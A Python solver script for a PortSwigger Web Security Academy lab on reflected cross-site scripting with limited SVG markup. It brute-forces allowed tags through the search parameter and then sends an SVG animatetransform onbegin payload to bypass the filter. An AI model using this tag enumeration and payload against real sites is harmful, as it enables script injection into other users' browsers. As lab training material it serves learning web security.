import requests
from urllib3.exceptions import InsecureRequestWarning
from time import sleep
from concurrent.futures import ThreadPoolExecutor
from bs4 import BeautifulSoup

requests.packages.urllib3.disable_warnings(category=InsecureRequestWarning)

# lab_url: https://portswigger.net/web-security/cross-site-scripting/contexts/lab-some-svg-markup-allowed
# author: 0xyf


class XSS16:
    def __init__(self):
        self.lab_id = "0a03009204d3cb5383e5413500b900b3"
        self.proxies = {"https": "http://127.0.0.1:8080"}

        self.url = f"https://{self.lab_id}.h1-web-security-academy.net"

    def query_tag(self, tag):
        params = {"search": f"<{tag}>"}
        response = requests.get(
            self.url, params=params, proxies=self.proxies, verify=False
        )
        if response.status_code == 200:
            return tag

    def enum_tags(self):
        with open(
            r"C:\Users\user\Documents\Github\portswigger-labs\xss\XSS16\tags.txt", "r"
        ) as file:
            tags = [line.strip() for line in file.readlines()]

        with ThreadPoolExecutor(max_workers=15) as executor:
            self.found_tags = [
                x for x in executor.map(self.query_tag, tags) if x is not None
            ]

        print(f"[*] found tags: {self.found_tags}")

        self.svg_tag = [x for x in self.found_tags if "svg" in x][
            0
        ]  # assume we take svg payload

        self.animate_tag = [x for x in self.found_tags if "animatetransform" in x][
            0
        ]  # assume we take animate payload

    def execute_request(self, payload):

        params = {"search": payload}

        r = requests.get(
            f"{self.url}",
            params=params,
            proxies=self.proxies,
            verify=False,
        )

        return r

    def reflected_xss(self):
        payload = f"<{self.svg_tag}><{self.animate_tag} onbegin=alert(1) attributeName=x dur=1s>"
        print(f"[*] payload: {payload}")
        r = self.execute_request(payload)

    def check_solved(self):
        sleep(2)
        r = requests.get(self.url)
        if "Congratulations, you solved the lab!" in r.text:
            print("Lab Solved")
        else:
            print("Did not solve lab, check payload")

    def solve(self):
        self.enum_tags()
        self.reflected_xss()
        self.check_solved()


def main():
    XSS16().solve()


if __name__ == "__main__":
    main()
